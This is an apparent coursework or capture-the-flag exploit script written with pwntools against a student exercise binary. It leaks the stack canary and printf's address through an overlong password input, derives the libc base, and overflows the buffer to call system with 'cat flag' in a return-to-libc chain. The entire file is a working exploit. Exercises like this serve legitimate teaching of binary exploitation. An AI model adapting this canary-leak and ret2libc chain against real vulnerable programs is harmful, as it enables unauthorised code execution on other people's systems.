#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

def fetch_canary_and_printf():
    print(r.recvline())
    r.sendline(b"cat flag")  ## inject our parameter into the 'name' variable 0x804c060
    print(r.recvuntil(b'Enter the secret password:\n'))
    r.sendline(b'A' * 119)
    output1 = r.recvline()
    print(output1)
    hint = r.recvline()  ### '$printf+9 $2 $3 $NAME   is not the password\n'
    print(hint)
    hint = hint[0: (-1) * len(" is not the password\n")] ## cut garbage
    printf_address = hint[:4]
    canary = hint[-4:]
    return canary, printf_address


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


'''
ebp - 0xc 0
ebp - 0x10 canary
ebp - 0x98 buffer
'''

r = start()
canary, printf_address = fetch_canary_and_printf()

printf_offset = 0x000502b0
system_offset = 0x00041780
exit_offset = 0x000340c0  # readelf -s /usr/lib/i386-linux-gnu/libc-2.31.so | grep exit
libc_base_address = u32(printf_address) - 9 - printf_offset
system_address = libc_base_address + system_offset
exit_address = libc_base_address + exit_offset

print(canary)
print(hex(system_address))
print(hex(exit_address))


padding = b"A" * 136

target_address = p32(system_address)
return_address = p32(exit_address)  ## doesn't matter, but let's make it exit
parameter = p32(0x804c060)  ## the address of name (cat flag)


command = padding + canary + b"A" * (12 + 4) + target_address + return_address + parameter

r.sendline(command)

print(r.recvall(timeout=3))
